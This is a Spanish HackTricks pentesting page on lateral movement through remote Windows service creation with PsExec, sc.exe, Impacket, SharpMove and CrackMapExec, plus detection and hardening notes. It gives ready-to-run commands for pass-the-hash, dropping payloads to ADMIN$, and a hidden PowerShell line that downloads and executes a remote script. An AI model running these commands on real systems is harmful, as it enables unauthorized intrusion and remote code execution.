# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Cómo funcionan

Estas técnicas abusan del Windows Service Control Manager (SCM) de forma remota a través de SMB/RPC para ejecutar comandos en un host objetivo. El flujo habitual es:

1. Autenticarse en el objetivo y acceder al recurso compartido ADMIN$ a través de SMB (TCP/445).
2. Copiar un ejecutable o especificar una línea de comandos de LOLBAS que ejecutará el servicio.
3. Crear un servicio de forma remota a través de SCM (MS-SCMR sobre \PIPE\svcctl) que apunte a ese comando o binario.
4. Iniciar el servicio para ejecutar el payload y, opcionalmente, capturar stdin/stdout mediante una named pipe.
5. Detener el servicio y limpiar (eliminar el servicio y cualquier binario copiado).

Requisitos y prerrequisitos:
- Ser administrador local en el objetivo (SeCreateServicePrivilege) o tener permisos explícitos para crear servicios en el objetivo.
- SMB (445) accesible y recurso compartido ADMIN$ disponible; Remote Service Management permitido a través del firewall del host.
- Restricciones remotas de UAC: en el caso de cuentas locales, el filtrado de tokens puede bloquear el acceso de administradores a través de la red, a menos que se use la cuenta integrada de Administrator o LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: usar un hostname/FQDN habilita Kerberos; conectarse mediante IP suele hacer que se use NTLM (y puede estar bloqueado en entornos reforzados).

### ScExec/WinExec manual mediante sc.exe

A continuación se muestra un enfoque mínimo para crear un servicio. La imagen del servicio puede ser un EXE copiado o un LOLBAS como cmd.exe o powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notas:
- Espera un error de timeout al iniciar un EXE que no sea un servicio; la ejecución sí se lleva a cabo.
- Para mantener una OPSEC más sólida, prefiere comandos fileless (`cmd /c`, `powershell -enc`) o elimina los artefactos depositados.

Consulta pasos más detallados en: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Herramientas y ejemplos

### Sysinternals PsExec.exe

- Herramienta clásica de administración que usa SMB para depositar PSEXESVC.exe en ADMIN$, instalar un servicio temporal (nombre predeterminado: PSEXESVC) y canalizar la entrada/salida a través de named pipes.
- Ejemplos de uso:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Puedes ejecutarlo directamente desde Sysinternals Live mediante WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Deja eventos de instalación/desinstalación del servicio (el nombre del servicio suele ser PSEXESVC, salvo que se use -r) y crea C:\Windows\PSEXESVC.exe durante la ejecución.

### Impacket psexec.py (similar a PsExec)

- Usa un servicio integrado similar a RemCom. Deja un binario de servicio transitorio (normalmente con un nombre aleatorio) a través de ADMIN$, crea un servicio (normalmente RemComSvc de forma predeterminada) y retransmite la E/S a través de una named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Artefactos
- EXE temporal en C:\Windows\ (8 caracteres aleatorios). El nombre del servicio predeterminado es RemComSvc, a menos que se sobrescriba.

### Impacket smbexec.py (SMBExec)

- Crea un servicio temporal que inicia cmd.exe y usa una named pipe para la entrada/salida. Por lo general, evita dejar un payload EXE completo; la ejecución de comandos es semiinteractiva.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa varios métodos de movimiento lateral, incluida la ejecución basada en servicios.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) incluye la modificación o creación de servicios para ejecutar un comando de forma remota.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- También puedes usar CrackMapExec para ejecutar mediante distintos backends (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, detección y artefactos

Artefactos habituales en el host/la red al usar técnicas similares a PsExec:
- Security 4624 (Logon Type 3) y 4672 (Special Privileges) en el objetivo para la cuenta de admin utilizada.
- Eventos Security 5140/5145 File Share y File Share Detailed que muestran el acceso a ADMIN$ y la creación/escritura de binarios de servicio (p. ej., PSEXESVC.exe o un .exe aleatorio de 8 caracteres).
- **System** 7045 del Service Control Manager por la instalación de un servicio en el objetivo: nombres como PSEXESVC, RemComSvc o uno personalizado (`-r` / `-service-name`). Esto demuestra que se instaló un servicio, no que se ejecutara su imagen. Correlaciona la marca de tiempo y la ruta de la imagen con eventos de procesos o con una entrada prefetch coincidente de la imagen del servicio, si está disponible.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) para services.exe o la imagen del servicio, 3 (Network Connect), 11 (File Create) en C:\Windows\, 17/18 (Pipe Created/Connected) para pipes como \\.\pipe\psexesvc, \\.\pipe\remcom_* o equivalentes aleatorios.
- Artefacto del registro para el EULA de Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 en el host del operador (si no se suprimió).

Ideas para la búsqueda
- Genera alertas sobre instalaciones de servicios cuyo ImagePath incluya cmd.exe /c, powershell.exe o ubicaciones TEMP.
- Busca creaciones de procesos donde ParentImage sea C:\Windows\PSEXESVC.exe o procesos secundarios de services.exe que se ejecuten como LOCAL SYSTEM y ejecuten shells.
- Marca los named pipes que terminen en -stdin/-stdout/-stderr o que usen nombres de pipes conocidos de clones de PsExec.

## Solución de problemas habituales
- Acceso denegado (5) al crear servicios: el usuario no es realmente admin local, hay restricciones UAC remotas para cuentas locales o protección contra manipulación de EDR en la ruta del binario del servicio.
- No se encontró la ruta de red (53) o no se pudo conectar a ADMIN$: el firewall bloquea SMB/RPC o los recursos compartidos de administración están deshabilitados.
- Kerberos falla, pero NTLM está bloqueado: conéctate usando el hostname/FQDN (no una IP), asegúrate de que los SPN sean correctos o proporciona -k/-no-pass con tickets al usar Impacket.
- Se agota el tiempo de espera al iniciar el servicio, pero el payload se ejecutó: es lo esperado si no se trata de un binario de servicio real; captura la salida en un archivo o usa smbexec para obtener E/S en tiempo real.

## Notas de hardening
- Windows 11 24H2 y Windows Server 2025 requieren SMB signing de forma predeterminada para las conexiones salientes (y entrantes en Windows 11). Esto no interrumpe el uso legítimo de PsExec con credenciales válidas, pero impide el abuso de SMB relay sin firma y puede afectar a los dispositivos que no admiten la firma.<sup>[[2]](#references)</sup>
- El nuevo bloqueo de NTLM del cliente SMB (Windows 11 24H2/Server 2025) puede impedir el fallback a NTLM al conectarse por IP o a servidores sin Kerberos. En entornos con hardening, esto interrumpirá PsExec/SMBExec basado en NTLM; usa Kerberos (hostname/FQDN) o configura excepciones si es necesario por motivos legítimos.<sup>[[2]](#references)</sup>
- Principio de mínimo privilegio: minimiza la pertenencia al grupo de administradores locales, prefiere Just-in-Time/Just-Enough Admin, aplica LAPS y supervisa/genera alertas sobre las instalaciones de servicios 7045.

## Ver también

- Ejecución remota basada en WMI (a menudo con menos archivos):

{{#ref}}
./wmiexec.md
{{#endref}}

- Ejecución remota basada en WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Hardening de seguridad de SMB en Windows Server 2025 y Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Usar credenciales para tomar el control de equipos Windows - Parte 2 (PSExec y servicios)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Solucionar reinicios inesperados mediante los registros de eventos del sistema](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
